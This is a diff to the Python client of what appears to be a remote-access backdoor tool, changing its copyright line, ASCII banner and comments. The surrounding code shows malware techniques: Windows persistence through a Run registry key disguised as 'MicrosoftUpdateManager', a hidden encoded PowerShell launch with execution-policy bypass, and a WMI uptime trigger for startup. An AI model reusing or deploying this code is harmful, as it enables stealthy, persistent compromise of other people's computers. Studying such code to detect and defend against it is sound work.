@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 #
-# Copyright (c) 2017 colental
+# Copyright (c) 2017 Daniel Vega-Myhre
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -23,23 +23,23 @@
 
 '''  
 
-,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
-""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
-,adPPPPP88 88       88 8b       88 88	       8b	88
-88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
-`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
-                        aa,    ,88 	        aa,    ,88
-                         "Y8bbdP"          	 "Y8bbdP'
+        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
+        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
+        ,adPPPPP88 88       88 8b       88 88	       8b	88
+        88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
+        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
+                                aa,    ,88 	        aa,    ,88
+                                 "Y8bbdP"          	 "Y8bbdP'
 
-                                               88                          ,d
-                                               88                          88
- ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
-a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
-8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
-"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
- `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
-            aa,    ,88  aa,    ,88 88                                      "Y888
-             "Y8bbdP"    "Y8bbdP"  88
+                                                       88                          ,d
+                                                       88                          88
+         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
+        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
+        8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
+        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
+         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
+                    aa,    ,88  aa,    ,88 88                                      "Y888
+                     "Y8bbdP"    "Y8bbdP"  88
 
 '''
 
@@ -97,7 +97,7 @@ class Client(object):
         self.commands   = self._commands()
         self.result     = self._result()
 
-# ----------------- private functions --------------------------
+# ----------------- private/worker functions --------------------------
 
     def _modules(self): return {mod: getattr(self, mod) for mod in __modules__}
 
@@ -115,7 +115,7 @@ class Client(object):
 
     def _commands(self): return {cmd: getattr(self, cmd) for cmd in __command__}
     
-    def _cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
+    def _cd(self, path): return os.chdir(path) if os.path.isdir(path) else os.chdir('.')
 
     def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
 
@@ -828,9 +828,9 @@ class Client(object):
                     except: pass
                     return False
 
-    def _persistence_add_registry_key(self, cmd=None, name='MicrosoftUpdateManager'):
+    def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
         reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
-        value   = cmd or long_to_bytes(long(self.__f__))
+        value   = long_to_bytes(long(self.__f__))
         try:
             SetValueEx(reg_key, name, 0, REG_SZ, value)
             CloseKey(reg_key)
@@ -842,7 +842,7 @@ class Client(object):
 
     def _persistence_remove_registry_key(self, name='MicrosoftUpdateManager'):
         try:
-            key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
+            key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
             DeleteValue(key, name)
             CloseKey(key)
             return True
@@ -855,7 +855,7 @@ class Client(object):
                 filename = long_to_bytes(long(self.__f__))
                 if not os.path.exists(filename):
                     return 'Error: file not found: {}'.format(filename)
-                cmd_line = filename
+                cmd_line = "start /min /b {}".format(filename)
             else:
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
             startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
@@ -961,7 +961,7 @@ class Client(object):
         cx.update({fx.func_name: fx})
         return fx
 
-# ------------------ Commands --------------------------
+# ------------------ public/client functions --------------------------
 
     @_command
     def set(self, x): return self._set(x)
